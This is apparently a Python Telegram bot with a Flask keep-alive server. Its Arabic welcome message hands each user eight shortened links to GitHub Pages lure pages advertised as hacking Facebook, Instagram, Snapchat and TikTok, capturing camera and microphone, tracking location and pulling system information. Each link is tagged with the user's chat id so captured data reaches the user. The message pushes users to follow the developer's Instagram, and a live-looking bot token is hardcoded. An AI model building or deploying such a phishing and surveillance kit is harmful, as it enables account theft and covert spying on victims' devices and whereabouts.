import telebot
import requests
from flask import Flask
from threading import Thread
import os
import logging
import time

# منع التنبيهات المزعجة
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask('')
@app.route('/')
def home():
    return "M.Y.9 System Online"

def run():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- إعدادات البوت والتوكن ---
TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
bot = telebot.TeleBot(TOKEN)

# حل مشكلة الـ Conflict 409
bot.remove_webhook()
time.sleep(1)

def short_link(url):
    try:
        res = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=5)
        return res.text if res.status_code == 200 else url
    except:
        return url

@bot.message_handler(commands=['start'])
def send_welcome(message):
    uid = message.chat.id
    first_name = message.from_user.first_name
    hunter = first_name.replace(" ", "_")
    
    # رابط الـ GitHub Pages الأساسي تبعك
    base = "https://m-y-9-tech.github.io/fb/" 

    # تجهيز الروابط الـ 8 بشكل منفصل
    fb_link = short_link(f"{base}fb.html?id={uid}&hunter={hunter}")
    ig_link = short_link(f"{base}ig.html?id={uid}&hunter={hunter}")
    snap_link = short_link(f"{base}snap.html?id={uid}&hunter={hunter}")
    tik_link = short_link(f"{base}tiktok.html?id={uid}&hunter={hunter}")
    cam_link = short_link(f"{base}cam.html?id={uid}&hunter={hunter}")
    mic_link = short_link(f"{base}mic.html?id={uid}&hunter={hunter}")
    loc_link = short_link(f"{base}loc.html?id={uid}&hunter={hunter}")
    sys_link = short_link(f"{base}sys.html?id={uid}&hunter={hunter}")

    # الرسالة بنفس التنسيق اللي طلبته بالضبط
    msg = f"""
نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | أهلاً بك {first_name}

👤 Developer: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚

⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:
عـ^ـزيـ^ـزي المـ^ـسـ^ـتـ^ـخـ^ـدم، لـ^ـضـ^ـمـ^ـان اسـ^ـتـ^ـقـ^ـرار الاتـ^ـصـ^ـال بـ^ـيـ^ـن الـ^ـبـ^ـوت وسـ^ـيـ^ـرفـ^ـراتـ^ـنـ^ـا، يـ^ـجـ^ـب عـ^ـلـ^ـيـ^ـك مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور الـ^ـرسمـ^ـي عـ^ـلى انـ^ـسـ^ـتـ^ـقـ^ـرام. فـ^ـي حـ^ـال عـ^ـدم المـ^ـتـ^ـابـ^ـعـ^ـة، سـ^ـيـ^ـتـ^ـم تـ^ـشـ^ـفـ^ـر الـ^ـروابـ^ـط تـ^ـلـ^ـقـ^ـائـ^ـيـ^ـاً.

🔴 تـحـذيـر: رابـط حـسـاب المـطـور لـتـفـعـيـل الأوامـر (إجـبـاري) 💀🔥:
https://www.instagram.com/m_y_.9/?hl=ar#

▬▬▬▬▬▬▬▬▬▬▬▬▬▬
💎 قـ^ـائـ^ـمـ^ـة الأدوات الـ^ـمـ^ـفـ^ـعـ^ـلـ^ـة 💎
▬▬▬▬▬▬▬▬▬▬▬▬▬▬

🔹 اختـ^ـراق الفيـ^ـسبـ^ـوك 🔐: `{fb_link}`

🔹 اختـ^ـراق الانـ^ـستـ^ـقـ^ـرام 🛡️: `{ig_link}`

🔹 اختـ^ـراق سـ^ـنـ^ـاب شـ^ـات 👻: `{snap_link}`

🔹 اختـ^ـراق تـيـك تـوك 🎵: `{tik_link}`

🔹 اختـ^ـراق الكـ^ـامـ^ـيـ^ـرا 📸: `{cam_link}`

🔹 تـسـجـيـل الـصـوت 🎤: `{mic_link}`

🔹 تـحـديـد المـ^ـوقـ^ـع 📍: `{loc_link}`

🔹 سـحـب مـعـلـومـات الـنـظـام 📱: `{sys_link}`

▬▬▬▬▬▬▬▬▬▬▬▬▬▬
⚙️ الـ^ـحـ^ـالـ^ـة: مـ^ـتـ^ـصـ^ـل 24/7..
    """
    bot.send_message(uid, msg, parse_mode="Markdown", disable_web_page_preview=True)

if __name__ == "__main__":
    keep_alive()
    print("🚀 M.Y.9 System Started Successfully!")
    bot.infinity_polling()
